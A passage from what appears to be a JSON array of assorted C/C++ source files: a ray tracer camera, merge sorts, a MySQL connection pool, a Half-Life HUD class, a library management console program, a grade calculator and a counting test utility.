std::vector<Typing::FaceLandmark>,\n                                       std::vector<Typing::Score>>>(\n        std::make_tuple(resultBoundingBoxes, resultFaceLandmarks, resultScores));\n}\n} // namespace Ffc",
    "#include \"camera.hpp\"\n#include \"common.hpp\"\n#include \"material.hpp\"\n\nvoid camera::initialize() {\n    image_height = int(image_width / aspect_ratio);\n    image_height = (image_height < 1) ? 1 : image_height;\n    pixel_samples_scale = 1.0 / samples_per_pixel;\n\n    center = lookfrom;\n\n    // Determine viewport dimensions.\n    auto focal_length = (lookfrom - lookat).length();\n    auto viewport_height =\n        2 * tan(degrees_to_radians(fov / 2)) * focus_distance;\n    auto viewport_width =\n        viewport_height * (double(image_width) / image_height);\n\n    w = unit_vector(lookfrom - lookat);\n    u = unit_vector(cross(vup, w));\n    v = cross(w, u);\n\n    // Calculate the vectors across the horizontal and down the vertical\n    // viewport edges.\n    auto viewport_u = viewport_width * u;\n    auto viewport_v = -viewport_height * v;\n\n    // Calculate the horizontal and vertical delta vectors from pixel to pixel.\n    pixel_delta_u = viewport_u / image_width;\n    pixel_delta_v = viewport_v / image_height;\n\n    // Calculate the location of the upper left pixel.\n    auto viewport_upper_left =\n        center - (focus_distance * w) - viewport_u / 2 - viewport_v / 2;\n    pixel00_loc = viewport_upper_left + 0.5 * (pixel_delta_u + pixel_delta_v);\n\n    auto defocus_radius =\n        focus_distance * tan(degrees_to_radians(defocus_angle / 2));\n    defocus_disk_u = u * defocus_radius;\n    defocus_disk_v = v * defocus_radius;\n}\n\ncolor3 camera::ray_color(const ray &r, const hittable &world, int depth) {\n    if (depth <= 0) return color3(0, 0, 0);\n\n    hit_record rec;\n    if (world.hit(r, interval(0.001, inf), rec)) {\n        ray scattered;\n        color3 attenuation;\n        if (rec.mat->scatter(r, rec, attenuation, scattered))\n            return attenuation * ray_color(scattered, world, depth - 1);\n\n        return color3(0, 0, 0);\n    }\n\n    vec3 unit_direction = unit_vector(r.direction());\n    auto a = 0.5 * (unit_direction.y() + 1.0);\n    return (1.0 - a) * color3(1.0, 1.0, 1.0) + a * color3(0.5, 0.7, 1.0);\n}\n\nvoid camera::render(const hittable &world) {\n    initialize();\n\n    std::cout << \"P3\\n\" << image_width << ' ' << image_height << \"\\n255\\n\";\n\n    for (int j = 0; j < image_height; j++) {\n        std::clog << \"\\rScanlines remaining: \" << (image_height - j) << ' '\n                  << std::flush;\n        for (int i = 0; i < image_width; i++) {\n            color3 pixel_color(0, 0, 0);\n            for (int sample = 0; sample < samples_per_pixel; sample++) {\n                auto r = get_ray(i, j);\n                pixel_color += ray_color(r, world, max_depth);\n            }\n            pixel_color *= pixel_samples_scale;\n            write_color(std::cout, pixel_color);\n        }\n    }\n\n    std::clog << \"\\rDone.                 \\n\";\n}\n\nvec3 camera::sample_square() const {\n    // Returns the vector to a random point in the [-.5,-.5]-[+.5,+.5] unit\n    // square.\n    return vec3(random_double() - 0.5, random_double() - 0.5, 0);\n}\n\npoint3 camera::defocus_disk_sample() const {\n    // Returns a random point in the camera defocus disk.\n    auto p = random_in_unit_disk();\n    return center + (p[0] * defocus_disk_u) + (p[1] * defocus_disk_v);\n}\n\nray camera::get_ray(int i, int j) const {\n    // Construct a camera ray originating from the origin and directed at\n    // randomly sampled point around the pixel location i, j.\n\n    auto offset = sample_square();\n    auto pixel_sample = pixel00_loc + ((i + offset.x()) * pixel_delta_u) +\n                        ((j + offset.y()) * pixel_delta_v);\n\n    auto ray_origin = defocus_angle <= 0 ? center : defocus_disk_sample();\n    auto ray_direction = pixel_sample - ray_origin;\n\n    return ray(ray_origin, ray_direction);\n}\n",
    "#include <iostream>\n#include <vector>\nusing namespace std;\n\nvoid merge(int *arr, int l, int mid, int r) {\n    int an = mid - l + 1;\n    int bn = r - mid;\n    vector<int> a(an), b(bn);\n\n    for (int i = 0; i < an; ++i) {\n        a[i] = arr[l + i];\n    }\n\n    for (int j = 0; j < bn; ++j) {\n        b[j] = arr[mid + 1 + j];\n    }\n\n    int i = 0, j = 0, k = l;\n\n    while (i < an && j < bn) {\n        if (a[i] < b[j]) {\n            arr[k++] = a[i++];\n        } else {\n            arr[k++] = b[j++];\n        }\n    }\n\n    while (i < an) {\n        arr[k++] = a[i++];\n    }\n\n    while (j < bn) {\n        arr[k++] = b[j++];\n    }\n}\n\nvoid merge_sort(int *arr, int l, int r) {\n    if (l >= r) {\n        return;\n    }\n    int mid = l + (r - l) / 2;\n    merge_sort(arr, l, mid);\n    merge_sort(arr, mid + 1, r);\n    merge(arr, l, mid, r);\n}\n\nint main() {\n    int arr[] = {9, 2, 4, 6, 3, 8, 1, 7};\n    int n = sizeof(arr) / sizeof(arr[0]);\n    merge_sort(arr, 0, n - 1);\n\n    for (int i = 0; i < n; ++i) {\n        cout << arr[i] << \" \";\n    }\n\n    return 0;\n}\n",
    "#include <mysql/mysql.h>         // MySQL\u5934\u6587\u4ef6\n#include <stdio.h>               // \u6807\u51c6\u8f93\u5165\u8f93\u51fa\u5934\u6587\u4ef6\n#include <string>                // C++\u5b57\u7b26\u4e32\u5e93\n#include <string.h>              // C\u5b57\u7b26\u4e32\u5904\u7406\u5e93\n#include <stdlib.h>              // \u6807\u51c6\u5e93\u5934\u6587\u4ef6\n#include <list>                  // C++\u5217\u8868\u5bb9\u5668\n#include <pthread.h>             // \u7ebf\u7a0b\u5e93\n#include <iostream>              // \u6807\u51c6\u8f93\u5165\u8f93\u51fa\u6d41\n#include \"sql_connection_pool.h\" // \u81ea\u5b9a\u4e49\u7684\u6570\u636e\u5e93\u8fde\u63a5\u6c60\u5934\u6587\u4ef6\n#include \"../base/Logging.h\"     // \u81ea\u5b9a\u4e49\u7684\u65e5\u5fd7\u5e93\u5934\u6587\u4ef6\n\nusing namespace std;\n\n// \u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316\u5f53\u524d\u8fde\u63a5\u6570\u548c\u7a7a\u95f2\u8fde\u63a5\u6570\nconnection_pool::connection_pool()\n{\n    m_CurConn = 0;\n    m_FreeConn = 0;\n}\n\n// \u83b7\u53d6\u8fde\u63a5\u6c60\u5b9e\u4f8b\uff0c\u4f7f\u7528\u5355\u4f8b\u6a21\u5f0f\nconnection_pool *connection_pool::GetInstance()\n{\n    static connection_pool connPool;\n    return &connPool;\n}\n\n// \u6784\u9020\u521d\u59cb\u5316\nvoid connection_pool::init(string url, string User, string PassWord, string DBName, int Port, int MaxConn, int close_log)\n{\n    LOG << \"Entering connection_pool::init\"; // \u65e5\u5fd7\u8bb0\u5f55\u8fdb\u5165\u51fd\u6570\n    m_url = url;                             // \u8bbe\u7f6e\u6570\u636e\u5e93URL\n    m_Port = Port;                           // \u8bbe\u7f6e\u6570\u636e\u5e93\u7aef\u53e3\n    m_User = User;                           // \u8bbe\u7f6e\u6570\u636e\u5e93\u7528\u6237\u540d\n    m_PassWord = PassWord;                   // \u8bbe\u7f6e\u6570\u636e\u5e93\u5bc6\u7801\n    m_DatabaseName = DBName;                 // \u8bbe\u7f6e\u6570\u636e\u5e93\u540d\n    m_close_log = close_log;                 // \u8bbe\u7f6e\u65e5\u5fd7\u5f00\u5173\n\n    LOG << \"Initializing connection pool with URL: \" << url\n        << \", User: \" << User\n        << \", DBName: \" << DBName\n        << \", Port: \" << Port\n        << \", MaxConn: \" << MaxConn; // \u65e5\u5fd7\u8bb0\u5f55\u521d\u59cb\u5316\u4fe1\u606f\n\n    for (int i = 0; i < MaxConn; i++) // \u5faa\u73af\u521b\u5efa\u6700\u5927\u8fde\u63a5\u6570\u7684\u6570\u636e\u5e93\u8fde\u63a5\n    {\n        LOG << \"Creating MySQL connection \" << i + 1 << \" of \" << MaxConn; // \u65e5\u5fd7\u8bb0\u5f55\u521b\u5efa\u8fde\u63a5\n        MYSQL *con = NULL;                                                 // \u5b9a\u4e49\u4e00\u4e2aMySQL\u8fde\u63a5\u6307\u9488\n        MYSQL *ret = NULL;                                                 // \u5b9a\u4e49\u4e00\u4e2aMySQL\u8fd4\u56de\u6307\u9488\n\n        LOG << \"Calling mysql_init\"; // \u65e5\u5fd7\u8bb0\u5f55\u8c03\u7528mysql_init\n        ret = mysql_init(con);       // \u521d\u59cb\u5316MySQL\u8fde\u63a5\n        if (ret == NULL)             // \u5982\u679c\u521d\u59cb\u5316\u5931\u8d25\n        {\n            LOG << \"MySQL Error: mysql_init() returns NULL\"; // \u65e5\u5fd7\u8bb0\u5f55\u9519\u8bef\n            exit(1);                                         // \u9000\u51fa\u7a0b\u5e8f\n        }\n        else\n        {\n            con = ret; // \u5982\u679c\u6210\u529f\uff0c\u8bbe\u7f6e\u8fde\u63a5\u6307\u9488\n        }\n\n        LOG << \"Calling mysql_real_connect\";                                                                       // \u65e5\u5fd7\u8bb0\u5f55\u8c03\u7528mysql_real_connect\n        ret = mysql_real_connect(con, url.c_str(), User.c_str(), PassWord.c_str(), DBName.c_str(), Port, NULL, 0); // \u8fde\u63a5\u5230\u6570\u636e\u5e93\n        if (ret == NULL)                                                                                           // \u5982\u679c\u8fde\u63a5\u5931\u8d25\n        {\n            string err_info(mysql_error(con));                                                     // \u83b7\u53d6\u9519\u8bef\u4fe1\u606f\n            err_info = \"MySQL Error[errno=\" + std::to_string(mysql_errno(con)) + \"]: \" + err_info; // \u683c\u5f0f\u5316\u9519\u8bef\u4fe1\u606f\n            LOG << err_info;                                                                       // \u65e5\u5fd7\u8bb0\u5f55\u9519\u8bef\u4fe1\u606f\n            exit(1);                                                                               // \u9000\u51fa\u7a0b\u5e8f\n        }\n        else\n        {\n            con = ret; // \u5982\u679c\u6210\u529f\uff0c\u8bbe\u7f6e\u8fde\u63a5\u6307\u9488\n        }\n\n        LOG << \"Adding connection to pool\"; // \u65e5\u5fd7\u8bb0\u5f55\u6dfb\u52a0\u8fde\u63a5\u5230\u8fde\u63a5\u6c60\n        connList.push_back(con);            // \u5c06\u8fde\u63a5\u6dfb\u52a0\u5230\u8fde\u63a5\u5217\u8868\n        ++m_FreeConn;                       // \u589e\u52a0\u7a7a\u95f2\u8fde\u63a5\u6570\n    }\n\n    LOG << \"Initializing semaphore with m_FreeConn = \" << m_FreeConn; // \u65e5\u5fd7\u8bb0\u5f55\u521d\u59cb\u5316\u4fe1\u53f7\u91cf\n    reserve = sem(m_FreeConn);                                        // \u521d\u59cb\u5316\u4fe1\u53f7\u91cf\n    m_MaxConn = m_FreeConn;                                           // \u8bbe\u7f6e\u6700\u5927\u8fde\u63a5\u6570\n    LOG << \"Connection pool initialized successfully\";                // \u65e5\u5fd7\u8bb0\u5f55\u521d\u59cb\u5316\u6210\u529f\n}\n\n// \u5f53\u6709\u8bf7\u6c42\u65f6\uff0c\u4ece\u6570\u636e\u5e93\u8fde\u63a5\u6c60\u4e2d\u8fd4\u56de\u4e00\u4e2a\u53ef\u7528\u8fde\u63a5\uff0c\u66f4\u65b0\u4f7f\u7528\u548c\u7a7a\u95f2\u8fde\u63a5\u6570\nMYSQL *connection_pool::GetConnection()\n{\n    MYSQL *con = NULL;\n\n    if (0 == connList.size()) // \u5982\u679c\u8fde\u63a5\u5217\u8868\u4e3a\u7a7a\n        return NULL;\n\n    reserve.wait(); // \u7b49\u5f85\u4fe1\u53f7\u91cf\n\n    lock.lock(); // \u52a0\u9501\n\n    con = connList.front(); // \u83b7\u53d6\u5217\u8868\u5934\u90e8\u7684\u8fde\u63a5\n    connList.pop_front();   // \u79fb\u9664\u5934\u90e8\u8fde\u63a5\n\n    --m_FreeConn; // \u51cf\u5c11\u7a7a\u95f2\u8fde\u63a5\u6570\n    ++m_CurConn;  // \u589e\u52a0\u5f53\u524d\u4f7f\u7528\u7684\u8fde\u63a5\u6570\n\n    lock.unlock(); // \u89e3\u9501\n    return con;    // \u8fd4\u56de\u83b7\u53d6\u7684\u8fde\u63a5\n}\n\n// \u91ca\u653e\u5f53\u524d\u4f7f\u7528\u7684\u8fde\u63a5\nbool connection_pool::ReleaseConnection(MYSQL *con)\n{\n    if (NULL == con) // \u5982\u679c\u8fde\u63a5\u4e3a\u7a7a\n        return false;\n\n    lock.lock(); // \u52a0\u9501\n\n    connList.push_back(con); // \u5c06\u8fde\u63a5\u653e\u56de\u5217\u8868\n    ++m_FreeConn;            // \u589e\u52a0\u7a7a\u95f2\u8fde\u63a5\u6570\n    --m_CurConn;             // \u51cf\u5c11\u5f53\u524d\u4f7f\u7528\u7684\u8fde\u63a5\u6570\n\n    lock.unlock(); // \u89e3\u9501\n\n    reserve.post(); // \u589e\u52a0\u4fe1\u53f7\u91cf\n    return true;\n}\n\n// \u9500\u6bc1\u6570\u636e\u5e93\u8fde\u63a5\u6c60\nvoid connection_pool::DestroyPool()\n{\n    lock.lock();             // \u52a0\u9501\n    if (connList.size() > 0) // \u5982\u679c\u8fde\u63a5\u5217\u8868\u4e0d\u4e3a\u7a7a\n    {\n        list<MYSQL *>::iterator it;                             // \u5b9a\u4e49\u5217\u8868\u8fed\u4ee3\u5668\n        for (it = connList.begin(); it != connList.end(); ++it) // \u904d\u5386\u5217\u8868\n        {\n            MYSQL *con = *it; // \u83b7\u53d6\u8fde\u63a5\n            mysql_close(con); // \u5173\u95ed\u8fde\u63a5\n        }\n        m_CurConn = 0;    // \u91cd\u7f6e\u5f53\u524d\u4f7f\u7528\u7684\u8fde\u63a5\u6570\n        m_FreeConn = 0;   // \u91cd\u7f6e\u7a7a\u95f2\u8fde\u63a5\u6570\n        connList.clear(); // \u6e05\u7a7a\u8fde\u63a5\u5217\u8868\n    }\n    lock.unlock(); // \u89e3\u9501\n}\n\n// \u5f53\u524d\u7a7a\u95f2\u7684\u8fde\u63a5\u6570\nint connection_pool::GetFreeConn()\n{\n    return this->m_FreeConn;\n}\n\n// \u6790\u6784\u51fd\u6570\uff0c\u9500\u6bc1\u8fde\u63a5\u6c60\nconnection_pool::~connectio",
    "/***\n*\n*\tCopyright (c) 1999, 2000 Valve LLC. All rights reserved.\n*\t\n*\tThis product contains software technology licensed from Id \n*\tSoftware, Inc. (\"Id Technology\").  Id Technology (c) 1996 Id Software, Inc. \n*\tAll Rights Reserved.\n*\n*   Use, distribution, and modification of this source code and/or resulting\n*   object code is restricted to non-commercial enhancements to products from\n*   Valve LLC.  All other use, distribution, or modification is prohibited\n*   without written permission from Valve LLC.\n*\n****/\n//\n// flashlight.cpp\n//\n// implementation of CHudFlashlight class\n//\n\n#include \"hud.h\"\n#include \"cl_util.h\"\n#include \"parsemsg.h\"\n\n#include <string.h>\n#include <stdio.h>\n\n\n\nDECLARE_MESSAGE(m_Flash, FlashBat)\nDECLARE_MESSAGE(m_Flash, Flashlight)\n\n#define BAT_NAME \"sprites/%d_Flashlight.spr\"\n\nint CHudFlashlight::Init(void)\n{\n\tm_fFade = 0;\n\tm_fOn = 0;\n\n\tHOOK_MESSAGE(Flashlight);\n\tHOOK_MESSAGE(FlashBat);\n\n\tm_iFlags |= HUD_ACTIVE;\n\n\tgHUD.AddHudElem(this);\n\n\treturn 1;\n};\n\nvoid CHudFlashlight::Reset(void)\n{\n\tm_fFade = 0;\n\tm_fOn = 0;\n}\n\nint CHudFlashlight::VidInit(void)\n{\n\tint HUD_flash_empty = gHUD.GetSpriteIndex( \"flash_empty\" );\n\tint HUD_flash_full = gHUD.GetSpriteIndex( \"flash_full\" );\n\tint HUD_flash_beam = gHUD.GetSpriteIndex( \"flash_beam\" );\n\n\tm_hSprite1 = gHUD.GetSprite(HUD_flash_empty);\n\tm_hSprite2 = gHUD.GetSprite(HUD_flash_full);\n\tm_hBeam = gHUD.GetSprite(HUD_flash_beam);\n\tm_prc1 = &gHUD.GetSpriteRect(HUD_flash_empty);\n\tm_prc2 = &gHUD.GetSpriteRect(HUD_flash_full);\n\tm_prcBeam = &gHUD.GetSpriteRect(HUD_flash_beam);\n\tm_iWidth = m_prc2->right - m_prc2->left;\n\n\treturn 1;\n};\n\nint CHudFlashlight:: MsgFunc_FlashBat(const char *pszName,  int iSize, void *pbuf )\n{\n\n\t\n\tBEGIN_READ( pbuf, iSize );\n\tint x = READ_BYTE();\n\tm_iBat = x;\n\tm_flBat = ((float)x)/100.0;\n\n\treturn 1;\n}\n\nint CHudFlashlight:: MsgFunc_Flashlight(const char *pszName,  int iSize, void *pbuf )\n{\n\n\tBEGIN_READ( pbuf, iSize );\n\tm_fOn = READ_BYTE();\n\tint x = READ_BYTE();\n\tm_iBat = x;\n\tm_flBat = ((float)x)/100.0;\n\n\treturn 1;\n}\n\nint CHudFlashlight::Draw(float flTime)\n{\n\treturn 1;\n}",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\n// Book structure\r\nstruct Book {\r\n    string title;\r\n    string author;\r\n    string isbn;\r\n    int quantity;\r\n};\r\n\r\n// Function declarations\r\nvoid addBook(vector<Book>& library);\r\nvoid removeBook(vector<Book>& library);\r\nvoid searchBook(const vector<Book>& library);\r\nvoid borrowBook(vector<Book>& library);\r\nvoid returnBook(vector<Book>& library);\r\nvoid displayBooks(const vector<Book>& library);\r\n\r\nint main() {\r\n    vector<Book> library;\r\n    int choice;\r\n\r\n    while (true) {\r\n        cout << \"Library Management System\\n\";\r\n        cout << \"1. Add Book\\n\";\r\n        cout << \"2. Remove Book\\n\";\r\n        cout << \"3. Search Book\\n\";\r\n        cout << \"4. Borrow Book\\n\";\r\n        cout << \"5. Return Book\\n\";\r\n        cout << \"6. Display All Books\\n\";\r\n        cout << \"7. Exit\\n\";\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n            case 1: addBook(library); break;\r\n            case 2: removeBook(library); break;\r\n            case 3: searchBook(library); break;\r\n            case 4: borrowBook(library); break;\r\n            case 5: returnBook(library); break;\r\n            case 6: displayBooks(library); break;\r\n            case 7: return 0;\r\n            default: cout << \"Invalid choice. Please try again.\\n\";\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\n// Function to add a book to the library\r\nvoid addBook(vector<Book>& library) {\r\n    Book newBook;\r\n    cout << \"Enter book title: \";\r\n    cin.ignore();\r\n    getline(cin, newBook.title);\r\n    cout << \"Enter book author: \";\r\n    getline(cin, newBook.author);\r\n    cout << \"Enter book ISBN: \";\r\n    getline(cin, newBook.isbn);\r\n    cout << \"Enter book quantity: \";\r\n    cin >> newBook.quantity;\r\n    library.push_back(newBook);\r\n    cout << \"Book added successfully.\\n\";\r\n}\r\n\r\n// Function to remove a book from the library\r\nvoid removeBook(vector<Book>& library) {\r\n    string isbn;\r\n    cout << \"Enter book ISBN to remove: \";\r\n    cin.ignore();\r\n    getline(cin, isbn);\r\n\r\n    auto it = remove_if(library.begin(), library.end(), [&](Book& b) {\r\n        return b.isbn == isbn;\r\n    });\r\n\r\n    if (it != library.end()) {\r\n        library.erase(it, library.end());\r\n        cout << \"Book removed successfully.\\n\";\r\n    } else {\r\n        cout << \"Book not found.\\n\";\r\n    }\r\n}\r\n\r\n// Function to search for a book in the library\r\nvoid searchBook(const vector<Book>& library) {\r\n    string query;\r\n    cout << \"Enter book title, author, or ISBN to search: \";\r\n    cin.ignore();\r\n    getline(cin, query);\r\n\r\n    for (const auto& book : library) {\r\n        if (book.title == query || book.author == query || book.isbn == query) {\r\n            cout << \"Book found: \\n\";\r\n            cout << \"Title: \" << book.title << \"\\n\";\r\n            cout << \"Author: \" << book.author << \"\\n\";\r\n            cout << \"ISBN: \" << book.isbn << \"\\n\";\r\n            cout << \"Quantity: \" << book.quantity << \"\\n\";\r\n            return;\r\n        }\r\n    }\r\n    cout << \"Book not found.\\n\";\r\n}\r\n\r\n// Function to borrow a book from the library\r\nvoid borrowBook(vector<Book>& library) {\r\n    string isbn;\r\n    cout << \"Enter book ISBN to borrow: \";\r\n    cin.ignore();\r\n    getline(cin, isbn);\r\n\r\n    for (auto& book : library) {\r\n        if (book.isbn == isbn) {\r\n            if (book.quantity > 0) {\r\n                --book.quantity;\r\n                cout << \"Book borrowed successfully.\\n\";\r\n            } else {\r\n                cout << \"Book is out of stock.\\n\";\r\n            }\r\n            return;\r\n        }\r\n    }\r\n    cout << \"Book not found.\\n\";\r\n}\r\n\r\n// Function to return a borrowed book to the library\r\nvoid returnBook(vector<Book>& library) {\r\n    string isbn;\r\n    cout << \"Enter book ISBN to return: \";\r\n    cin.ignore();\r\n    getline(cin, isbn);\r\n\r\n    for (auto& book : library) {\r\n        if (book.isbn == isbn) {\r\n            ++book.quantity;\r\n            cout << \"Book returned successfully.\\n\";\r\n            return;\r\n        }\r\n    }\r\n    cout << \"Book not found.\\n\";\r\n}\r\n\r\n// Function to display all books in the library\r\nvoid displayBooks(const vector<Book>& library) {\r\n    if (library.empty()) {\r\n        cout << \"No books in the library.\\n\";\r\n        return;\r\n    }\r\n\r\n    for (const auto& book : library) {\r\n        cout << \"Title: \" << book.title << \"\\n\";\r\n        cout << \"Author: \" << book.author << \"\\n\";\r\n        cout << \"ISBN: \" << book.isbn << \"\\n\";\r\n        cout << \"Quantity: \" << book.quantity << \"\\n\";\r\n        cout << \"-------------------------\\n\";\r\n    }\r\n}\r\n",
    "// Merge Sort: Divide and conquer approach, divides the array into half and sort the half part and again finally merge those two sorted arrays\n\nvoid merge(int arr[], int l, int mid, int r)\n{\n    int n1 = mid - l + 1;\n    int n2 = r - mid;\n\n    int a[n1];\n    int b[n2]; // temps arrays\n\n    for (int i = 0; i < n1; i++)\n    {\n        a[i] = arr[l + i];\n    }\n    first array, second array for (int i = 0; i < n2; i++)\n    {\n        b[i] = arr[mid + 1 + i];\n    }\n\n    int i = 0;\n    int j = 0;\n    int k = l;\n\n    while (i < n1 && j < n2)\n    {\n        if (a[i] < b[j])\n        {\n            arr[k] = a[i];\n            k++;\n            i++;\n        }\n        else\n        {\n            arr[k] = b[j];\n            k++;\n            j++;\n        }\n    }\n    while (i < n1)\n    {\n        arr[k] = a[i];\n        k++;\n        i++;\n    }\n    while (j < n2)\n    {\n        arr[k] = b[j];\n        k++;\n        j++;\n    }\n}\n\nvoid mergeSort(int arr[], int l, int r)\n{\n    if (l < r)\n    {\n        int mid = (l + r) / 2;\n        divide left and right\n            mergeSort(arr, l, mid);\n        mergeSort(arr, mid + 1, r);\n        merge(arr, l, mid, r);\n    }\n}",
    "#include \"nota.h\"\n#include \"usuarios.h\"\n\n#include <iostream>\n#include <cmath>\nusing namespace std;\n\n//Tengo que cambiar el 1\u00ba 0 por i y el 2\u00ba por j\ndouble calcularParcial1(int i, int j){\n    //Vamos a calcular el promedio final\n    double C, D, P, porcEC, porcED, porcEP, promfinal1;\n    C = alumno[i].notas[j].primer_parcial.EC;\n    porcEC = alumno[i].notas[j].primer_parcial.porc_EC;\n    D = alumno[i].notas[j].primer_parcial.ED;\n    porcED = alumno[i].notas[j].primer_parcial.porc_ED;\n    P =alumno[i].notas[j].primer_parcial.EP;\n    porcEP = alumno[i].notas[j].primer_parcial.porc_EP;\n\n    promfinal1 = ((C*porcEC)+(D*porcED)+(P*porcEP));\n    alumno[i].notas[j].primer_parcial.prom_parcial1 = promfinal1;\n    return promfinal1;\n\n}\ndouble calcularParcial2(int i, int j){\n    double C, D, P, porcEC, porcED, porcEP, promfinal2;\n    C = alumno[i].notas[j].segundo_parcial.EC;\n    porcEC = alumno[i].notas[j].segundo_parcial.porc_EC;\n    D = alumno[i].notas[j].segundo_parcial.ED;\n    porcED = alumno[i].notas[j].segundo_parcial.porc_ED;\n    P =alumno[i].notas[j].segundo_parcial.EP;\n    porcEP = alumno[i].notas[j].segundo_parcial.porc_EP;\n\n    promfinal2 = ((C*porcEC)+(D*porcED)+(P*porcEP));\n    alumno[i].notas[j].segundo_parcial.prom_parcial2 = promfinal2;\n    return promfinal2;\n}\n\nint calcularNotaFinal(double Parcial_1, double Parcial_2){\n    double promfinal;\n\n    promfinal = (Parcial_1 + Parcial_2)/2;\n    alumno[0].notas[1].nota_final = round(promfinal);\n    return alumno[0].notas[1].nota_final;\n}",
    "#include \"cpputils/counter.h\"\n\n#include <cstdlib>       // for abort\n#include <ostream>       // for ostream\n#include <stdexcept>     // for runtime_error\n#include <unordered_set> // for unordered_set\n#include <utility>       // for swap, pair\n\nnamespace cpputils {\nstatic inline constexpr bool counter_enable_unordered_set = true;\n\nauto singleton_constructed_objects() -> std::unordered_set<counter::obj const*>& {\n    static std::unordered_set<counter::obj const*> static_data{};\n    return static_data;\n}\n\ncounter::obj::obj()\n    : m_data(0)\n    , m_counts(nullptr) {\n    if constexpr (counter_enable_unordered_set) {\n        if (!singleton_constructed_objects().emplace(this).second) {\n            fmt::print(\"ERROR at {}({}): {}\\n\", __FILE__, __LINE__, __func__);\n            std::abort();\n        }\n    }\n    ++static_default_ctor;\n}\n\ncounter::obj::obj(const size_t& data, counter& counts)\n    : m_data(data)\n    , m_counts(&counts) {\n    if constexpr (counter_enable_unordered_set) {\n        if (!singleton_constructed_objects().emplace(this).second) {\n            fmt::print(\"ERROR at {}({}): {}\\n\", __FILE__, __LINE__, __func__);\n            std::abort();\n        }\n    }\n    ++m_counts->m_data.m_ctor;\n}\n\ncounter::obj::obj(const counter::obj& o)\n    : m_data(o.m_data)\n    , m_counts(o.m_counts) {\n    if constexpr (counter_enable_unordered_set) {\n        if (1 != singleton_constructed_objects().count(&o)) {\n            fmt::print(\"ERROR at {}({}): {}\\n\", __FILE__, __LINE__, __func__);\n            std::abort();\n        }\n        if (!singleton_constructed_objects().emplace(this).second) {\n            fmt::print(\"ERROR at {}({}): {}\\n\", __FILE__, __LINE__, __func__);\n            std::abort();\n        }\n    }\n    if (nullptr != m_counts) {\n        ++m_counts->m_data.m_copy_ctor;\n    }\n}\n\ncounter::obj::obj(counter::obj&& o) noexcept\n    : m_data(o.m_data)\n    , m_counts(o.m_counts) {\n    if constexpr (counter_enable_unordered_set) {\n        if (1 != singleton_constructed_objects().count(&o)) {\n            fmt::print(\"ERROR at {}({}): {}\\n\", __FILE__, __LINE__, __func__);\n            std::abort();\n        }\n        if (!singleton_constructed_objects().emplace(this).second) {\n            fmt::print(\"ERROR at {}({}): {}\\n\", __FILE__, __LINE__, __func__);\n            std::abort();\n        }\n    }\n    if (nullptr != m_counts) {\n        ++m_counts->m_data.m_move_ctor;\n    }\n}\n\ncounter::obj::~obj() {\n    if constexpr (counter_enable_unordered_set) {\n        if (1 != singleton_constructed_objects().erase(this)) {\n            fmt::print(\"ERROR at {}({}): {}\\n\", __FILE__, __LINE__, __func__);\n            std::abort();\n        }\n    }\n    if (nullptr != m_counts) {\n        ++m_counts->m_data.m_dtor;\n    } else {\n        ++static_dtor;\n    }\n}\n\nauto counter::obj::operator==(obj const& o) const -> bool {\n    if constexpr (counter_enable_unordered_set) {\n        if (1 != singleton_constructed_objects().count(this) || 1 != singleton_constructed_objects().count(&o)) {\n            fmt::print(\"ERROR at {}({}): {}\\n\", __FILE__, __LINE__, __func__);\n            std::abort();\n        }\n    }\n    if (nullptr != m_counts) {\n        ++m_counts->m_data.m_equals;\n    }\n    return m_data == o.m_data;\n}\n\nauto counter::obj::operator<(obj const& o) const -> bool {\n    if constexpr (counter_enable_unordered_set) {\n        if (1 != singleton_constructed_objects().count(this) || 1 != singleton_constructed_objects().count(&o)) {\n            fmt::print(\"ERROR at {}({}): {}\\n\", __FILE__, __LINE__, __func__);\n            std::abort();\n        }\n    }\n    if (nullptr != m_counts) {\n        ++m_counts->m_data.m_less;\n    }\n    return m_data < o.m_data;\n}\n\n// NOLINTNEXTLINE(bugprone-unhandled-self-assignment,cert-oop54-cpp)\nauto counter::obj::operator=(obj const& o) -> counter::obj& {\n    if constexpr (counter_enable_unordered_set) {\n        if (1 != singleton_constructed_objects().count(this) || 1 != singleton_constructed_objects().count(&o)) {\n            fmt::print(\"ERROR at {}({}): {}\\n\", __FILE__, __LINE__, __func__);\n            std::abort();\n        }\n    }\n    m_counts = o.m_counts;\n    if (nullptr != m_counts) {\n        ++m_counts->m_data.m_assign;\n    }\n    m_data = o.m_data;\n    return *this;\n}\n\nauto counter::obj::operator=(obj&& o) noexcept -> counter::obj& {\n    if constexpr (counter_enable_unordered_set) {\n        if (1 != singleton_constructed_objects().count(this) || 1 != singleton_constructed_objects().count(&o)) {\n            fmt::print(\"ERROR at {}({}): {}\\n\", __FILE__, __LINE__, __func__);\n            std::abort();\n        }\n    }\n    if (nullptr != o.m_counts) {\n        m_counts = o.m_counts;\n    }\n    m_data = o.m_data;\n    if (nullptr != m_counts) {\n        ++m_counts->m_data.m_move_assign;\n    }\n    return *this;\n}\n\nauto counter::obj::get() const -> size_t const& {\n    if (nullptr != m_counts) {\n        ++m_counts->m_data.m_const_get;\n    }\n    return m_data;\n}\n\nauto counter::obj::get() -> size_t& {\n    if (nullptr != m_counts) {\n       ",
    "/*\n * Copyright (C) 2012 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"suggest/core/dicnode/dic_node_utils.h\"\n\n#include \"dictionary/interface/dictionary_structure_with_buffer_policy.h\"\n#include \"suggest/core/dicnode/dic_node.h\"\n#include \"suggest/core/dicnode/dic_node_vector.h\"\n\nnamespace latinime {\n\n///////////////////////////////\n// Node initialization utils //\n///////////////////////////////\n\n/* static */ void DicNodeUtils::initAsRoot(\n        const DictionaryStructureWithBufferPolicy *const dictionaryStructurePolicy,\n        const WordIdArrayView prevWordIds, DicNode *const newRootDicNode) {\n    